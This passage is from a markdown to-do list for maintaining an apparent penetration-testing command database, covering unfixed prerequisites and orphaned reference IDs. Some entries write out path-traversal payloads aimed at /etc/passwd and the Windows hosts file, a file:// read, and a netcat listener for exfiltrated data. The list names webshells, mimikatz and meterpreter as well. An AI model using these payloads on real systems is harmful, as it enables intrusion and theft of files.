- [ ] **Action**: Replace with command IDs or create missing commands

### 173. `netsh-portproxy-delete`

- [ ] **Command ID**: `netsh-portproxy-delete`
- [ ] **File**: `pivoting/windows-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `Administrator privileges`
- [ ] **Action**: Replace with command IDs or create missing commands

### 174. `netsh-firewall-add-rule`

- [ ] **Command ID**: `netsh-firewall-add-rule`
- [ ] **File**: `pivoting/windows-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `Administrator privileges`
- [ ] **Action**: Replace with command IDs or create missing commands

### 175. `netsh-firewall-delete-rule`

- [ ] **Command ID**: `netsh-firewall-delete-rule`
- [ ] **File**: `pivoting/windows-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `Administrator privileges`
- [ ] **Action**: Replace with command IDs or create missing commands

### 176. `powershell-wget`

- [ ] **Command ID**: `powershell-wget`
- [ ] **File**: `pivoting/windows-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `PowerShell available (default on Windows 7+)`
  - `HTTP server running on attacker machine: python3 -m http.server 80`
  - `Network connectivity to attacker IP`
- [ ] **Action**: Replace with command IDs or create missing commands

### 177. `certutil-download`

- [ ] **Command ID**: `certutil-download`
- [ ] **File**: `pivoting/windows-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `Certutil available (default on Windows)`
  - `HTTP server running on attacker`
- [ ] **Action**: Replace with command IDs or create missing commands

### 178. `exfil-uploadserver`

- [ ] **Command ID**: `exfil-uploadserver`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current prerequisites (text)**:
  - `pip3 install uploadserver`
- [ ] **Action**: Replace with command IDs or create missing commands

### 179. `exfil-smb-upload`

- [ ] **Command ID**: `exfil-smb-upload`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current prerequisites (text)**:
  - `impacket-smbserver <SHARE> $(pwd) -smb2support`
- [ ] **Action**: Replace with command IDs or create missing commands

### 180. `exfil-nc-tcp-upload`

- [ ] **Command ID**: `exfil-nc-tcp-upload`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current prerequisites (text)**:
  - `nc -lvnp <PORT> > <OUTPUT_FILE>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 181. `rdesktop-disk-share`

- [ ] **Command ID**: `rdesktop-disk-share`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current prerequisites (text)**:
  - `mkdir -p <LOCAL_PATH>`
  - `sudo nmap -p <PORT> -Pn -v <TARGET> to verify RDP accessible`
- [ ] **Action**: Replace with command IDs or create missing commands

### 182. `enumerate-capabilities`

- [ ] **Command ID**: `enumerate-capabilities`
- [ ] **File**: `post-exploit/linux-capabilities-commands.json`
- [ ] **Current prerequisites (text)**:
  - `Read access to directories being searched`
  - `getcap utility installed (part of libcap package)`
  - `Linux kernel with capabilities support (2.6.24+)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 183. `filter-exploitable-caps`

- [ ] **Command ID**: `filter-exploitable-caps`
- [ ] **File**: `post-exploit/linux-capabilities-commands.json`
- [ ] **Current prerequisites (text)**:
  - `Output from getcap enumeration`
  - `Knowledge of dangerous capability types`
  - `Understanding of capability exploitation techniques`
- [ ] **Action**: Replace with command IDs or create missing commands

### 184. `gtfobins-cap-lookup`

- [ ] **Command ID**: `gtfobins-cap-lookup`
- [ ] **File**: `post-exploit/linux-capabilities-commands.json`
- [ ] **Current prerequisites (text)**:
  - `Identified exploitable capability from filter step`
  - `Binary name extracted from getcap output`
  - `Internet access or cached GTFOBins/HackTricks documentation`
- [ ] **Action**: Replace with command IDs or create missing commands

### 185. `execute-cap-exploit`

- [ ] **Command ID**: `execute-cap-exploit`
- [ ] **File**: `post-exploit/linux-capabilities-commands.json`
- [ ] **Current prerequisites (text)**:
  - `Identified capability/binary combination from previous steps`
  - `GTFOBins technique researched and understood`
  - `All dependencies available (shells, libraries, etc.)`
  - `Write access to /tmp or other working directory if needed`
- [ ] **Action**: Replace with command IDs or create missing commands

### 186. `verify-cap-access`

- [ ] **Command ID**: `verify-cap-access`
- [ ] **File**: `post-exploit/linux-capabilities-commands.json`
- [ ] **Current prerequisites (text)**:
  - `Capability exploitation attempted in previous step`
  - `Shell access to run verification commands`
  - `Knowledge of expected access level from capability type`
- [ ] **Action**: Replace with command IDs or create missing commands

### 187. `cap-exploit-dac-override-passwd-edit`

- [ ] **Command ID**: `cap-exploit-dac-override-passwd-edit`
- [ ] **File**: `post-exploit/linux-capabilities-commands.json`
- [ ] **Current prerequisites (text)**:
  - `Text editor binary with cap_dac_override+ep`
  - `Understanding of /etc/passwd format`
  - `Ability to use text editor (vim or nano commands)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 188. `smb-mount-share`

- [ ] **Command ID**: `smb-mount-share`
- [ ] **File**: `recon.json`
- [ ] **Current prerequisites (text)**:
  - `sudo mkdir -p <MOUNT_POINT>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 189. `wpscan-password-attack`

- [ ] **Command ID**: `wpscan-password-attack`
- [ ] **File**: `web/wordpress.json`
- [ ] **Current prerequisites (text)**:
  - `wpscan-enumerate-all (to discover usernames)`
- [ ] **Action**: Replace with command IDs or create missing commands


---
## 🟡 Orphaned References

**Total**: 53

### 1. `%252e%252e%252f`

- [ ] **Referenced ID**: `%252e%252e%252f`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 2. `....//....//etc/passwd`

- [ ] **Referenced ID**: `....//....//etc/passwd`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 3. `..\..\..\..\windows\system32\drivers\etc\hosts`

- [ ] **Referenced ID**: `..\..\..\..\windows\system32\drivers\etc\hosts`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 4. `Get-Acl`

- [ ] **Referenced ID**: `Get-Acl`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 5. `Get-NetComputer`

- [ ] **Referenced ID**: `Get-NetComputer`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 6. `Get-NetGroup`

- [ ] **Referenced ID**: `Get-NetGroup`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 7. `Get-ScheduledTask`

- [ ] **Referenced ID**: `Get-ScheduledTask`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 8. `Get-Service`

- [ ] **Referenced ID**: `Get-Service`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 9. `administrator-privileges`

- [ ] **Referenced ID**: `administrator-privileges`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 10. `asp-cmd-webshell`

- [ ] **Referenced ID**: `asp-cmd-webshell`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 11. `burp-intercept-login`

- [ ] **Referenced ID**: `burp-intercept-login`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 12. `cme-winrm-exec`

- [ ] **Referenced ID**: `cme-winrm-exec`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 13. `custom-obfuscation`

- [ ] **Referenced ID**: `custom-obfuscation`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 14. `dsacls`

- [ ] **Referenced ID**: `dsacls`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 15. `execute-suid-exploit-base64`

- [ ] **Referenced ID**: `execute-suid-exploit-base64`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 16. `execute-suid-exploit-nmap`

- [ ] **Referenced ID**: `execute-suid-exploit-nmap`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 17. `execute-suid-exploit-vim`

- [ ] **Referenced ID**: `execute-suid-exploit-vim`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 18. `exploit-suggester`

- [ ] **Referenced ID**: `exploit-suggester`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 19. `file:///etc/passwd`

- [ ] **Referenced ID**: `file:///etc/passwd`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 20. `ftp-anonymous-test`

- [ ] **Referenced ID**: `ftp-anonymous-test`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 21. `hashcat-create-rules`

- [ ] **Referenced ID**: `hashcat-create-rules`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 22. `identify-bad-chars`

- [ ] **Referenced ID**: `identify-bad-chars`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 23. `keepass2john`

- [ ] **Referenced ID**: `keepass2john`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 24. `local-admin-user`

- [ ] **Referenced ID**: `local-admin-user`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 25. `manual-meterpreter-payload-execution`

- [ ] **Referenced ID**: `manual-meterpreter-payload-execution`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 26. `manual-mimikatz-upload`

- [ ] **Referenced ID**: `manual-mimikatz-upload`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 27. `manual-postgresql-setup`

- [ ] **Referenced ID**: `manual-postgresql-setup`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 28. `manual-token-impersonation`

- [ ] **Referenced ID**: `manual-token-impersonation`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 29. `meterpreter-session-active`

- [ ] **Referenced ID**: `meterpreter-session-active`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 30. `msf-resource-create`

- [ ] **Referenced ID**: `msf-resource-create`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 31. `msf-resource-load`

- [ ] **Referenced ID**: `msf-resource-load`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 32. `msfvenom-payload-generated`

- [ ] **Referenced ID**: `msfvenom-payload-generated`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 33. `multi-homed-target`

- [ ] **Referenced ID**: `multi-homed-target`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 34. `nmap-ftp-detect`

- [ ] **Referenced ID**: `nmap-ftp-detect`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 35. `nmap-ssh-detect`

- [ ] **Referenced ID**: `nmap-ssh-detect`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 36. `pdf2john`

- [ ] **Referenced ID**: `pdf2john`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 37. `pentestmonkey-php-shell`

- [ ] **Referenced ID**: `pentestmonkey-php-shell`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 38. `post/windows/gather/screen_spy`

- [ ] **Referenced ID**: `post/windows/gather/screen_spy`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 39. `rar2john`

- [ ] **Referenced ID**: `rar2john`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 40. `script-shell-upgrade`

- [ ] **Referenced ID**: `script-shell-upgrade`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 41. `session-active`

- [ ] **Referenced ID**: `session-active`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 42. `shell-session-active`

- [ ] **Referenced ID**: `shell-session-active`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 43. `shellcode-encryption`

- [ ] **Referenced ID**: `shellcode-encryption`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 44. `socat-listener-tty`

- [ ] **Referenced ID**: `socat-listener-tty`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 45. `ss-listening-tcp`

- [ ] **Referenced ID**: `ss-listening-tcp`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 46. `tomcat-manager-credentials`

- [ ] **Referenced ID**: `tomcat-manager-credentials`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 47. `user-logged-in`

- [ ] **Referenced ID**: `user-logged-in`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 48. `users`

- [ ] **Referenced ID**: `users`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 49. `win-ps-get-process-by-id`

- [ ] **Referenced ID**: `win-ps-get-process-by-id`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 50. `win-ps-unquoted-service-path`

- [ ] **Referenced ID**: `win-ps-unquoted-service-path`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 51. `win-tcpview`

- [ ] **Referenced ID**: `win-tcpview`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 52. `writable-remote-directory`

- [ ] **Referenced ID**: `writable-remote-directory`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo

### 53. `zip2john`

- [ ] **Referenced ID**: `zip2john`
- [ ] **Status**: Referenced but doesn't exist
- [ ] **Action**: Create command or fix typo


---
## Progress Tracking

### Phase 1: Duplicate IDs
- [ ] Fixed: 0 / 14
- [ ] Remaining: 14

### Phase 2: Alternatives
- [ ] Fixed: 0 / 387
- [ ] Remaining: 387

### Phase 3: Prerequisites
- [ ] Fixed: 0 / 189
- [ ] Remaining: 189

### Phase 4: Orphaned References
- [ ] Fixed: 0 / 53
- [ ] Remaining: 53


---

**Last Updated**: 2025-11-08 23:53:13
